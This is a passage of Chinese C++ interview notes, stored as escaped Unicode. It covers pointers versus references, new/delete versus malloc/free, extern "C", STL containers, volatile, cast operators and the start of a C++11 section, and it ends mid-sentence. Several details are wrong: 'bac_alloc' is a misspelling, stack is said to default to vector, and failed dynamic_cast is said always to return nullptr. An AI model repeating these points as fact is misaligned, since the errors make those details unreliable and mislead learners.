\u4e0d\u5b58\u5728\u6307\u5411\u7a7a\u503c\u7684\u5f15\u7528\uff0c\u4f46\u662f\u5b58\u5728\u6307\u5411\u7a7a\u503c\u7684\u6307\u9488\u3002 \u5f15\u7528\u7684\u521b\u5efa\u548c\u9500\u6bc1\u4e0d\u4f1a\u8c03\u7528\u7c7b\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u548c\u6790\u6784\u51fd\u6570\u3002 \u6307\u9488\u53ef\u4ee5\u6709\u591a\u7ea7\uff0c\u4f46\u662f\u5f15\u7528\u53ea\u80fd\u662f\u4e00\u7ea7\uff08int **p\uff1b\u5408\u6cd5 \u800c int &&a\u662f\u4e0d\u5408\u6cd5\u7684\uff09\u3002 malloc \u548c new\uff0cfree \u548c delete \u7684\u533a\u522b \uf0c1 new/delete\u662fC++\u5173\u952e\u5b57\uff0c\u9700\u8981\u7f16\u8bd1\u5668\u652f\u6301\u3002malloc/free\u662f\u5e93\u51fd\u6570\uff0c\u9700\u8981\u5934\u6587\u4ef6\u652f\u6301\u3002 \u4f7f\u7528new\u64cd\u4f5c\u7b26\u7533\u8bf7\u5185\u5b58\u5206\u914d\u65f6\u65e0\u987b\u6307\u5b9a\u5185\u5b58\u5757\u7684\u5927\u5c0f\uff0c\u7f16\u8bd1\u5668\u4f1a\u6839\u636e\u7c7b\u578b\u4fe1\u606f\u81ea\u884c\u8ba1\u7b97\u3002\u800cmalloc\u5219\u9700\u8981\u663e\u5f0f\u5730\u6307\u51fa\u6240\u9700\u5185\u5b58\u7684\u5c3a\u5bf8\u3002 new\u64cd\u4f5c\u7b26\u5185\u5b58\u5206\u914d\u6210\u529f\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\u7c7b\u578b\u7684\u6307\u9488\uff0c\u7c7b\u578b\u4e25\u683c\u4e0e\u5bf9\u8c61\u5339\u914d\uff0c\u65e0\u987b\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff0c\u6545new\u662f\u7b26\u5408\u7c7b\u578b\u5b89\u5168\u6027\u7684\u64cd\u4f5c\u7b26\u3002\u800cmalloc\u5185\u5b58\u5206\u914d\u6210\u529f\u5219\u662f\u8fd4\u56devoid * \uff0c\u9700\u8981\u901a\u8fc7\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u5c06void*\u6307\u9488\u8f6c\u6362\u6210\u6211\u4eec\u9700\u8981\u7684\u7c7b\u578b\u3002 new\u5185\u5b58\u5206\u914d\u5931\u8d25\u65f6\uff0c\u4f1a\u629b\u51fabac_alloc\u5f02\u5e38\u3002malloc\u5206\u914d\u5185\u5b58\u5931\u8d25\u65f6\u8fd4\u56deNULL\u3002 new\u4f1a\u5148\u8c03\u7528operator new\u51fd\u6570\uff0c\u7533\u8bf7\u8db3\u591f\u7684\u5185\u5b58\uff08\u901a\u5e38\u5e95\u5c42\u4f7f\u7528malloc\u5b9e\u73b0\uff09\u3002\u7136\u540e\u8c03\u7528\u7c7b\u578b\u7684\u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316\u6210\u5458\u53d8\u91cf\uff0c\u6700\u540e\u8fd4\u56de\u81ea\u5b9a\u4e49\u7c7b\u578b\u6307\u9488\u3002delete\u5148\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528operator delete\u51fd\u6570\u91ca\u653e\u5185\u5b58\uff08\u901a\u5e38\u5e95\u5c42\u4f7f\u7528free\u5b9e\u73b0\uff09\u3002malloc/free\u662f\u5e93\u51fd\u6570\uff0c\u53ea\u80fd\u52a8\u6001\u7684\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\uff0c\u65e0\u6cd5\u5f3a\u5236\u8981\u6c42\u5176\u505a\u81ea\u5b9a\u4e49\u7c7b\u578b\u5bf9\u8c61\u6784\u9020\u548c\u6790\u6784\u5de5\u4f5c\u3002 C++\u5141\u8bb8\u91cd\u8f7dnew/delete\u64cd\u4f5c\u7b26\uff0c\u7279\u522b\u7684\uff0c\u5e03\u5c40new\u7684\u5c31\u4e0d\u9700\u8981\u4e3a\u5bf9\u8c61\u5206\u914d\u5185\u5b58\uff0c\u800c\u662f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5730\u5740\u4f5c\u4e3a\u5185\u5b58\u8d77\u59cb\u533a\u57df\uff0cnew\u5728\u8fd9\u6bb5\u5185\u5b58\u4e0a\u4e3a\u5bf9\u8c61\u8c03\u7528\u6784\u9020\u51fd\u6570\u5b8c\u6210\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5e76\u8fd4\u56de\u6b64\u5730\u5740\u3002\u800cmalloc\u4e0d\u5141\u8bb8\u91cd\u8f7d\u3002 new\u64cd\u4f5c\u7b26\u4ece\u81ea\u7531\u5b58\u50a8\u533a\uff08free store\uff09\u4e0a\u4e3a\u5bf9\u8c61\u52a8\u6001\u5206\u914d\u5185\u5b58\u7a7a\u95f4\uff0c\u800cmalloc\u51fd\u6570\u4ece\u5806\u4e0a\u52a8\u6001\u5206\u914d\u5185\u5b58\u3002\u81ea\u7531\u5b58\u50a8\u533a\u662fC++\u57fa\u4e8enew\u64cd\u4f5c\u7b26\u7684\u4e00\u4e2a\u62bd\u8c61\u6982\u5ff5\uff0c\u51e1\u662f\u901a\u8fc7new\u64cd\u4f5c\u7b26\u8fdb\u884c\u5185\u5b58\u7533\u8bf7\uff0c\u8be5\u5185\u5b58\u5373\u4e3a\u81ea\u7531\u5b58\u50a8\u533a\u3002\u800c\u5806\u662f\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u672f\u8bed\uff0c\u662f\u64cd\u4f5c\u7cfb\u7edf\u6240\u7ef4\u62a4\u7684\u4e00\u5757\u7279\u6b8a\u5185\u5b58\uff0c\u7528\u4e8e\u7a0b\u5e8f\u7684\u5185\u5b58\u52a8\u6001\u5206\u914d\uff0cC\u8bed\u8a00\u4f7f\u7528malloc\u4ece\u5806\u4e0a\u5206\u914d\u5185\u5b58\uff0c\u4f7f\u7528free\u91ca\u653e\u5df2\u5206\u914d\u7684\u5bf9\u5e94\u5185\u5b58\u3002\u81ea\u7531\u5b58\u50a8\u533a\u4e0d\u7b49\u4e8e\u5806\uff0c\u5982\u4e0a\u6240\u8ff0\uff0c\u5e03\u5c40new\u5c31\u53ef\u4ee5\u4e0d\u4f4d\u4e8e\u5806\u4e2d\u3002 PS: \u5728C++\u4e2d\uff0c\u5185\u5b58\u533a\u5206\u4e3a5\u4e2a\u533a\uff0c\u5206\u522b\u662f\u5806\u3001\u6808\u3001\u81ea\u7531\u5b58\u50a8\u533a\u3001\u5168\u5c40/\u9759\u6001\u5b58\u50a8\u533a\u3001\u5e38\u91cf\u5b58\u50a8\u533a\uff1b \u5728C\u4e2d\uff0cC\u5185\u5b58\u533a\u5206\u4e3a\u5806\u3001\u6808\u3001\u5168\u5c40/\u9759\u6001\u5b58\u50a8\u533a\u3001\u5e38\u91cf\u5b58\u50a8\u533a\uff1b extern C \u7684\u4f5c\u7528 \uf0c1 \u4e3b\u8981\u4f5c\u7528\u5c31\u662f\u4e3a\u4e86\u80fd\u591f\u6b63\u786e\u5b9e\u73b0C++\u4ee3\u7801\u8c03\u7528\u5176\u4ed6C\u8bed\u8a00\u4ee3\u7801\u3002\u88abextern \"C\"\u4fee\u9970\u7684\u53d8\u91cf\u548c\u51fd\u6570\u662f\u6309\u7167C\u8bed\u8a00\u65b9\u5f0f\u8fdb\u884c\u7f16\u8bd1\u548c\u94fe\u63a5\u7684\u3002 \u7531\u4e8eC++\u652f\u6301\u51fd\u6570\u91cd\u8f7d\uff0c\u56e0\u6b64\u7f16\u8bd1\u5668\u7f16\u8bd1\u51fd\u6570\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\u4e5f\u52a0\u5230\u7f16\u8bd1\u540e\u7684\u4ee3\u7801\u4e2d\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u51fd\u6570\u540d\uff1b\u800cC\u8bed\u8a00\u5e76\u4e0d\u652f\u6301\u51fd\u6570\u91cd\u8f7d\uff0c\u56e0\u6b64\u7f16\u8bd1C\u8bed\u8a00\u4ee3\u7801\u7684\u51fd\u6570\u65f6\u4e0d\u4f1a\u5e26\u4e0a\u51fd\u6570\u7684\u53c2\u6570\u7c7b\u578b\uff0c\u4e00\u822c\u53ea\u5305\u62ec\u51fd\u6570\u540d\u3002\u8fd9\u4e2a\u529f\u80fd\u5341\u5206\u6709\u7528\u5904\uff0c\u56e0\u4e3a\u5728C++\u51fa\u73b0\u4ee5\u524d\uff0c\u5f88\u591a\u4ee3\u7801\u90fd\u662fC\u8bed\u8a00\u5199\u7684\uff0c\u800c\u4e14\u5f88\u5e95\u5c42\u7684\u5e93\u4e5f\u662fC\u8bed\u8a00\u5199\u7684\uff0c\u4e3a\u4e86\u66f4\u597d\u7684\u652f\u6301\u539f\u6765\u7684C\u4ee3\u7801\u548c\u5df2\u7ecf\u5199\u597d\u7684C\u8bed\u8a00\u5e93\uff0c\u9700\u8981\u5728C++\u4e2d\u5c3d\u53ef\u80fd\u7684\u652f\u6301C\uff0c\u800cextern \"C\"\u5c31\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u7b56\u7565\u3002 \u88abextern \"C\"\u9650\u5b9a\u7684\u51fd\u6570\u6216\u53d8\u91cf\u662fextern\u7c7b\u578b\u7684\uff0cextern\u662fC/C++\u8bed\u8a00\u4e2d\u8868\u660e\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\u7684\u4f5c\u7528\u8303\u56f4\u7684\u5173\u952e\u5b57\uff0c\u8be5\u5173\u952e\u5b57\u544a\u8bc9\u7f16\u8bd1\u5668\uff0c\u5176\u7533\u660e\u7684\u51fd\u6570\u548c\u53d8\u91cf\u53ef\u4ee5\u5728\u672c\u6a21\u5757\u6216\u5176\u4ed6\u6a21\u5757\u4e2d\u4f7f\u7528\u3002 extern\u5bf9\u5e94\u7684\u5173\u952e\u5b57\u662fstatic\uff0cstatic\u8868\u660e\u53d8\u91cf\u6216\u8005\u51fd\u6570\u53ea\u80fd\u5728\u672c\u6a21\u5757\u4e2d\u4f7f\u7528\uff0c\u56e0\u6b64\uff0c\u88abstatic\u4fee\u9970\u7684\u53d8\u91cf\u6216\u8005\u51fd\u6570\u4e0d\u53ef\u80fd\u88abextern C\u4fee\u9970\u3002 \u5e38\u7528\u7684\u5bb9\u5668\u6709\u54ea\u4e9b \uf0c1 \u987a\u5e8f\u6027\u5bb9\u5668 vector: \u662f\u4e00\u6bb5\u8fde\u7eed\u7684\u5185\u5b58\u5730\u5740\uff0c\u57fa\u4e8e\u6570\u7ec4\u5b9e\u73b0\uff0c\u5176\u63d0\u4f9b\u4e86\u81ea\u52a8\u5185\u5b58\u7ba1\u7406\u529f\u80fd\uff08\u91c7\u7528\u4e86STL\u666e\u904d\u7684\u5185\u5b58\u7ba1\u7406\u5668allocator\uff09\uff0c\u53ef\u4ee5\u52a8\u6001\u6539\u53d8\u5bf9\u8c61\u957f\u5ea6\uff0c\u63d0\u4f9b\u968f\u673a\u8bbf\u95ee\u3002\u5728\u5c3e\u90e8\u6dfb\u52a0\u548c\u5220\u9664\u5143\u7d20\u7684\u65f6\u95f4\u662f\u5e38\u6570\u7684\uff0c\u4f46\u5728\u5934\u90e8\u6216\u4e2d\u95f4\u5c31\u662f\u7ebf\u6027\u65f6\u95f4\u3002 list: \u975e\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u57fa\u4e8e\u94fe\u8868\u5b9e\u73b0\uff0c\u5c5e\u4e8e\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u76ee\u7684\u662f\u5b9e\u73b0\u5feb\u901f\u63d2\u5165\u548c\u5220\u9664\uff0c\u4f46\u662f\u968f\u5373\u8bbf\u95ee\u5374\u662f\u6bd4\u8f83\u6162\u3002 forward_list: \u5b9e\u73b0\u4e86\u5355\u94fe\u8868\uff0c\u4e0d\u53ef\u53cd\u8f6c\u3002\u76f8\u6bd4\u4e8elist\uff0cforward_list\u66f4\u7b80\u5355\uff0c\u66f4\u7d27\u51d1\uff0c\u4f46\u529f\u80fd\u4e5f\u66f4\u5c11\u3002 deque: \u53cc\u7aef\u961f\u5217\uff08double-ended queue\uff09\uff0c\u652f\u6301\u968f\u673a\u8bbf\u95ee\uff0c\u4e0evector\u7c7b\u4f3c\uff0c\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u4ecedeque\u5bf9\u8c61\u7684\u5f00\u59cb\u4f4d\u7f6e\u63d2\u5165\u548c\u5220\u9664\u5143\u7d20\u7684\u65f6\u95f4\u4e5f\u662f\u5e38\u6570\u7684\uff0c\u6240\u4ee5\u82e5\u591a\u6570\u64cd\u4f5c\u53d1\u751f\u5728\u5e8f\u5217\u7684\u8d77\u59cb\u548c\u7ed3\u5c3e\u5904\uff0c\u5219\u5e94\u8003\u8651\u4f7f\u7528deque\u3002\u4e3a\u5b9e\u73b0\u5728deque\u4e24\u7aef\u6267\u884c\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u7684\u65f6\u95f4\u4e3a\u5e38\u6570\u65f6\u95f4\u8fd9\u4e00\u76ee\u7684\uff0cdeque\u5bf9\u8c61\u7684\u8bbe\u8ba1\u6bd4vector\u66f4\u4e3a\u590d\u6742\uff0c\u56e0\u6b64\uff0c\u5c3d\u7ba1\u4e8c\u8005\u90fd\u63d0\u4f9b\u5bf9\u5143\u7d20\u7684\u968f\u673a\u8bbf\u95ee\u548c\u5728\u5e8f\u5217\u4e2d\u90e8\u6267\u884c\u7ebf\u6027\u65f6\u95f4\u7684\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\uff0c\u4f46vector\u5bb9\u5668\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\u65f6\u901f\u5ea6\u66f4\u5feb\u4e9b\u3002 queue: \u662f\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u5148\u8fdb\u5148\u51fa\u3002queue\u6a21\u677f\u8ba9\u5e95\u5c42\u7c7b\uff08\u9ed8\u8ba4\u662fdeque\uff09\u5c55\u793a\u5178\u578b\u7684\u961f\u5217\u63a5\u53e3\u3002queue\u6a21\u677f\u7684\u9650\u5236\u6bd4deque\u66f4\u591a\uff0c\u5b83\u4e0d\u4ec5\u4e0d\u5141\u8bb8\u968f\u673a\u8bbf\u95ee\u961f\u5217\u5143\u7d20\uff0c\u751a\u81f3\u4e0d\u5141\u8bb8\u904d\u5386\u961f\u5217\u3002\u4e0e\u961f\u5217\u76f8\u540c\uff0c\u53ea\u80fd\u5c06\u5143\u7d20\u6dfb\u52a0\u5230\u961f\u5c3e\u3001\u4ece\u961f\u9996\u5220\u9664\u5143\u7d20\u3001\u67e5\u770b\u961f\u9996\u548c\u961f\u5c3e\u7684\u503c\u3001\u68c0\u67e5\u5143\u7d20\u6570\u76ee\u548c\u6d4b\u8bd5\u961f\u5217\u662f\u5426\u4e3a\u7a7a\u3002 priority_queue: \u662f\u53e6\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u652f\u6301\u7684\u64cd\u4f5c\u4e0equeue\u76f8\u540c\uff0c\u4f46\u6700\u9ad8\u4f18\u5148\u7ea7\u5143\u7d20\u603b\u662f\u7b2c\u4e00\u4e2a\u51fa\u5217\u3002\u4e24\u8005\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u5728priority_queue\u4e2d\uff0c\u6700\u5927\u7684\u5143\u7d20\u88ab\u79fb\u5230\u961f\u9996\u3002\u5185\u90e8\u533a\u522b\u5728\u4e8e\uff0c\u9ed8\u8ba4\u7684\u5e95\u5c42\u7c7b\u662fvector\u3002\u53ef\u4ee5\u4fee\u6539\u7528\u4e8e\u786e\u5b9a\u54ea\u4e2a\u5143\u7d20\u653e\u5230\u961f\u9996\u7684\u6bd4\u8f83\u65b9\u5f0f\uff0c\u65b9\u6cd5\u662f\u63d0\u4f9b\u4e00\u4e2a\u53ef\u9009\u7684\u6784\u9020\u51fd\u6570\u53c2\u6570\u3002 stack: \u4e0equeue\u76f8\u4f3c\uff0cstack\u4e5f\u662f\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u5b83\u7ed9\u5e95\u5c42\u7c7b\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3avector\uff09\u63d0\u4f9b\u4e86\u5178\u578b\u7684\u6808\u63a5\u53e3\uff0c\u540e\u8fdb\u5148\u51fa\u3002 \u5173\u8054\u5bb9\u5668: \u4e3b\u8981\u6709map\u548cset\u3002map\u662fkey-value\u5f62\u5f0f\u7684\uff0cset\u662f\u5355\u503c\u3002map\u548cset\u53ea\u80fd\u5b58\u653e\u552f\u4e00\u7684key\u503c\uff0cmultimap\u548cmultiset\u53ef\u4ee5\u5b58\u653e\u591a\u4e2a\u76f8\u540c\u7684key\u503c\u3002\u5e95\u5c42\u90fd\u57fa\u4e8e\u6811\u578b\u7ed3\u6784\u3002 map/multimap: map\u5bb9\u5668\u63d0\u4f9b\u4e00\u4e2a\u952e\u503c\u5bf9(key-value)\u5bb9\u5668\uff0cmap\u4e0emultimap\u5dee\u522b\u4ec5\u4ec5\u5728\u4e8emultimap\u5141\u8bb8\u4e00\u4e2a\u952e\u5bf9\u5e94\u591a\u4e2a\u503c\u3002\u5bf9\u4e8e\u8fed\u4ee3\u5668\u6765\u8bf4\uff0c\u53ef\u4ee5\u4fee\u6539\u5b9e\u503c\uff0c\u800c\u4e0d\u80fd\u4fee\u6539key\u3002map\u4f1a\u6839\u636ekey\u81ea\u52a8\u6392\u5e8f\u3002 set/multiset: set\u7684\u542b\u4e49\u662f\u96c6\u5408\uff0c\u5b83\u662f\u4e00\u4e2a\u6709\u5e8f\u7684\u5bb9\u5668\uff0c\u91cc\u9762\u7684\u5143\u7d20\u90fd\u662f\u6392\u5e8f\u597d\u7684\u652f\u6301\u63d2\u5165\u3001\u5220\u9664\u3001\u67e5\u627e\u7b49\u64cd\u4f5c\uff0c\u5c31\u50cf\u4e00\u4e2a\u96c6\u5408\u4e00\u6837\uff0c\u6240\u6709\u7684\u64cd\u4f5c\u90fd\u662f\u4e25\u683c\u5728logn\u65f6\u95f4\u5185\u5b8c\u6210\uff0c\u6548\u7387\u975e\u5e38\u9ad8\u3002set\u548cmultiset\u7684\u533a\u522b\u662f,set\u63d2\u5165\u7684\u5143\u7d20\u4e0d\u80fd\u76f8\u540c\uff0c\u4f46\u662fmultiset\u53ef\u4ee5\u76f8\u540c\uff0cset\u9ed8\u8ba4\u662f\u81ea\u52a8\u6392\u5e8f\u7684\uff0c\u4f7f\u7528\u65b9\u6cd5\u7c7b\u4f3clist\u3002 volatile \u5173\u952e\u5b57\u7684\u4f5c\u7528 \uf0c1 volatile\u6307\u51fa\u53d8\u91cf\u662f\u968f\u65f6\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u7684\uff0c\u4e0evolatile\u53d8\u91cf\u6709\u5173\u7684\u8fd0\u7b97\uff0c\u4e0d\u8981\u8fdb\u884c\u7f16\u8bd1\u4f18\u5316\uff0c\u4ee5\u514d\u51fa\u9519\uff0c\u5982\u5728C\u8bed\u8a00\u4e2d\uff0cvolatile\u5173\u952e\u5b57\u53ef\u4ee5\u7528\u6765\u63d0\u9192\u7f16\u8bd1\u5668\u5b83\u540e\u9762\u6240\u5b9a\u4e49\u7684\u53d8\u91cf\u968f\u65f6\u6709\u53ef\u80fd\u6539\u53d8\uff0c\u56e0\u6b64\u7f16\u8bd1\u540e\u7684\u7a0b\u5e8f\u6bcf\u6b21\u9700\u8981\u5b58\u50a8\u6216\u8bfb\u53d6\u8fd9\u4e2a\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u90fd\u4f1a\u76f4\u63a5\u4ece\u53d8\u91cf\u5730\u5740\u4e2d\u8bfb\u53d6\u6570\u636e\u3002\u5982\u679c\u6ca1\u6709volatile\u5173\u952e\u5b57\uff0c\u5219\u7f16\u8bd1\u5668\u53ef\u80fd\u4f18\u5316\u8bfb\u53d6\u548c\u5b58\u50a8\uff0c\u53ef\u80fd\u6682\u65f6\u4f7f\u7528\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\uff0c\u5982\u679c\u8fd9\u4e2a\u53d8\u91cf\u7531\u522b\u7684\u7a0b\u5e8f\u66f4\u65b0\u4e86\u7684\u8bdd\uff0c\u5c06\u51fa\u73b0\u4e0d\u4e00\u81f4\u7684\u73b0\u8c61\u3002 VC++ \u5728\u4ea7\u751frelease\u7248\u53ef\u6267\u884c\u7801\u65f6\u4f1a \u8fdb\u884c\u7f16\u8bd1\u4f18\u5316\uff0c\u52a0volatile\u5173\u952e\u5b57\u7684\u53d8\u91cf\u6709\u5173\u7684\u8fd0\u7b97\uff0c\u5c06\u4e0d\u8fdb\u884c\u7f16\u8bd1\u4f18\u5316\u3002 \u4e00\u4e2a\u5b9a\u4e49\u4e3avolatile\u7684\u53d8\u91cf\u662f\u8bf4\u8fd9\u53d8\u91cf\u53ef\u80fd\u4f1a\u88ab\u610f\u60f3\u4e0d\u5230\u5730\u6539\u53d8\uff0c\u8fd9\u6837\uff0c\u7f16\u8bd1\u5668\u5c31\u4e0d\u4f1a\u53bb\u5047\u8bbe\u8fd9\u4e2a\u53d8\u91cf\u7684\u503c\u4e86\u3002\u7cbe\u786e\u5730\u8bf4\u5c31\u662f\uff0c\u4f18\u5316\u5668\u5728\u7528\u5230\u8fd9\u4e2a\u53d8\u91cf\u65f6\u5fc5\u987b\u6bcf\u6b21\u90fd\u5c0f\u5fc3\u5730\u91cd\u65b0\u8bfb\u53d6\u8fd9\u4e2a\u53d8\u91cf\u7684\u503c\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u4fdd\u5b58\u5728\u5bc4\u5b58\u5668\u91cc\u7684\u5907\u4efd\u3002\u4e0b\u9762\u662fvolatile\u53d8\u91cf\u7684\u51e0\u4e2a\u4f8b\u5b50\uff1a \u5e76\u884c\u8bbe\u5907\u7684\u786c\u4ef6\u5bc4\u5b58\u5668\uff08\u5982\uff1a\u72b6\u6001\u5bc4\u5b58\u5668\uff09 \u4e00\u4e2a\u4e2d\u65ad\u670d\u52a1\u5b50\u7a0b\u5e8f\u4e2d\u4f1a\u8bbf\u95ee\u5230\u7684\u975e\u81ea\u52a8\u53d8\u91cf(Non-automatic variables) \u591a\u7ebf\u7a0b\u5e94\u7528\u4e2d\u88ab\u51e0\u4e2a\u4efb\u52a1\u5171\u4eab\u7684\u53d8\u91cf \u56de\u7b54\u4e0d\u51fa\u8fd9\u4e2a\u95ee\u9898\u7684\u4eba\u662f\u4e0d\u4f1a\u88ab\u96c7\u4f63\u7684\u3002 \u641e\u5d4c\u5165\u5f0f\u7684\u5bb6\u4f19\u4eec\u7ecf\u5e38\u540c\u786c\u4ef6\u3001\u4e2d\u65ad\u3001RTOS\u7b49\u7b49\u6253\u4ea4\u9053\uff0c\u6240\u6709\u8fd9\u4e9b\u90fd\u8981\u6c42\u7528\u5230volatile\u53d8\u91cf\u3002\u4e0d\u61c2\u5f97volatile\u7684\u5185\u5bb9\u5c06\u4f1a\u5e26\u6765\u707e\u96be\u3002 \u6709\u54ea\u51e0\u79cd\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u4ee5\u53ca\u4f7f\u7528\u573a\u666f \uf0c1 C\u98ce\u683c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u5982 Type b = (Type)a; C++\u98ce\u683c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u6709static_cast\u3001const_cast\u3001reinterpret_cast\u548cdynamic_cast\u56db\u79cd\u3002 static_cast: \u6bd4C\u98ce\u683c\u7684\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u8981\u5b89\u5168\u5f88\u591a\uff0c\u6709\u5f88\u5927\u7a0b\u5ea6\u4e0a\u7684\u7c7b\u578b\u5b89\u5168\u68c0\u67e5\u3002\u4f46\u7ed3\u679c\u53ef\u80fd\u4f1a\u51fa\u9519\uff0c\u800c\u4e14\u7f16\u8bd1\u5668\u4e0d\u4f1a\u7ed9\u51fa\u9519\u8bef\u4fe1\u606f\u3002\u6709\u660e\u663e\u7f3a\u70b9\u7684\uff0c\u90a3\u5c31\u662f\u65e0\u6cd5\u6d88\u9664const\u548cvolatile\u5c5e\u6027\u3002 const_cast: \u53bb\u9664\u6389const\u6216volitale\u5c5e\u6027\u3002\u4e0d\u662f\u7528\u4e8e\u53bb\u9664\u53d8\u91cf\u7684\u5e38\u91cf\u6027\uff0c\u800c\u662f\u53bb\u9664\u6307\u5411\u5e38\u91cf\u5bf9\u8c61\u7684\u6307\u9488\u6216\u5f15\u7528\u7684\u5e38\u91cf\u6027\uff0c\u5176\u53bb\u9664\u5e38\u91cf\u6027\u7684\u5bf9\u8c61\u5fc5\u987b\u4e3a\u6307\u9488\u6216\u5f15\u7528\uff0c\u5e76\u4e14const_cast\u4e0d\u652f\u6301\u4e0d\u540c\u7c7b\u578b\u6307\u9488\u6216\u5f15\u7528\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u6bd4\u5982\u8bf4float \u8f6c\u6362\u6210int \u662f\u4e0d\u5141\u8bb8\u7684\uff0c\u76f8\u5dee\u7684\u8bdd\u53ea\u80fd\u5deeconst\u6216volatile\u5c5e\u6027\u3002 reinterpret_cast: \u610f\u4e3a\u201c\u91cd\u65b0\u89e3\u91ca\u201d\uff0c\u5b83\u662fC++\u4e2d\u6700\u63a5\u8fd1\u4e8eC\u98ce\u683c\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u7684\u4e00\u4e2a\u5173\u952e\u5b57\u3002\u5b83\u8ba9\u7a0b\u5e8f\u5458\u80fd\u591f\u5c06\u4e00\u79cd\u5bf9\u8c61\u7c7b\u578b\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\uff0c\u4e0d\u7ba1\u5b83\u4eec\u662f\u5426\u76f8\u5173\u3002\u53ef\u4ee5\u5148\u4f7f\u7528reinterpret_cast\u628a\u4e00\u4e2a\u6307\u9488\u8f6c\u6362\u6210\u4e00\u4e2a\u6574\u6570\uff0c\u518d\u628a\u8be5\u6574\u6570\u8f6c\u6362\u6210\u539f\u7c7b\u578b\u7684\u6307\u9488\uff0c\u8fd8\u53ef\u4ee5\u5f97\u5230\u539f\u5148\u7684\u6307\u9488\u503c\u3002\u4f7f\u7528reinterpret_cast\u5f3a\u5236\u8f6c\u6362\u8fc7\u7a0b\u4ec5\u4ec5\u53ea\u662f\u6bd4\u7279\u4f4d\u7684\u62f7\u8d1d\uff0c\u548cC\u98ce\u683c\u6781\u5176\u76f8\u4f3c\uff0c\u5b9e\u9645\u4e0areinterpret_cast\u7684\u51fa\u73b0\u5c31\u662f\u4e3a\u4e86\u8ba9\u7f16\u8bd1\u5668\u5f3a\u5236\u63a5\u53d7static_cast\u4e0d\u5141\u8bb8\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u56e0\u6b64\u4f7f\u7528\u7684\u65f6\u5019\u8981\u8c28\u800c\u614e\u4e4b\u3002 dynamic_cast: \u662f\u8fd0\u884c\u65f6\u5904\u7406\u7684\uff0c\u8fd0\u884c\u65f6\u4f1a\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\uff08\u8fd9\u70b9\u548cstatic_cast\u5dee\u5f02\u8f83\u5927\uff09\u3002\u4e0d\u80fd\u7528\u4e8e\u5185\u7f6e\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u5f3a\u5236\u8f6c\u6362\uff0c\u53ea\u80fd\u5bf9\u6307\u9488\u6216\u5f15\u7528\u8fdb\u884c\u5f3a\u5236\u8f6c\u6362\u3002\u5982\u679c\u8f6c\u6362\u6210\u529f\u7684\u8bdd\u8fd4\u56de\u7684\u662f\u6307\u5411\u7c7b\u7684\u6307\u9488\u6216\u5f15\u7528\uff0c\u8f6c\u6362\u5931\u8d25\u7684\u8bdd\u5219\u4f1a\u8fd4\u56denullptr\u3002\u8fdb\u884c\u4e0a\u884c\u8f6c\u6362\u65f6\uff0c\u4e0estatic_cast\u7684\u6548\u679c\u662f\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u8fdb\u884c\u4e0b\u884c\u8f6c\u6362\u65f6\uff0cdynamic_cast\u5177\u6709\u7c7b\u578b\u68c0\u67e5\u7684\u529f\u80fd\uff0c\u6bd4static_cast\u66f4\u5b89\u5168\u3002\u800c\u4e14dynamic_cast\u8fd0\u884c\u65f6\u7684\u7c7b\u578b\u68c0\u67e5\u9700\u8981\u6709\u8fd0\u884c\u65f6\u7c7b\u578b\u4fe1\u606f\uff0c\u8fd9\u4e2a\u4fe1\u606f\u662f\u5b58\u50a8\u5728\u7c7b\u7684\u865a\u8868\u4e2d\u7684\u3002 C++11 \u65b0\u7279\u6027 \uf0c1 \u7b80\u5355\u8bf4\u4e00\u4e9b\u5e38\u89c1\u7684C++11\u7684\u65b0\u7279\u6027\u3002 nullptr: \u7a7a\u6307\u9488\uff0c\u7528\u6765\u66ff\u4ee3NULL\u3002 \u4f20\u7edf C++ \u4f1a\u628a NULL\u30010 \u89c6\u4e3a\u540c\u4e00\u79cd\u4e1c\u897f\uff0c\u8fd9\u53d6\u51b3\u4e8e\u7f16\u8bd1\u5668\u5982\u4f55\u5b9a\u4e49 NULL\uff0c\u6709\u4e9b\u7f16\u8bd1\u5668\u4f1a\u5c06 NULL \u5b9a\u4e49\u4e3a ((void*)0) \uff0c\u6709\u4e9b\u5219\u4f1a\u76f4\u63a5\u5c06\u5176\u5b9a\u4e49\u4e3a 0\u3002C++ 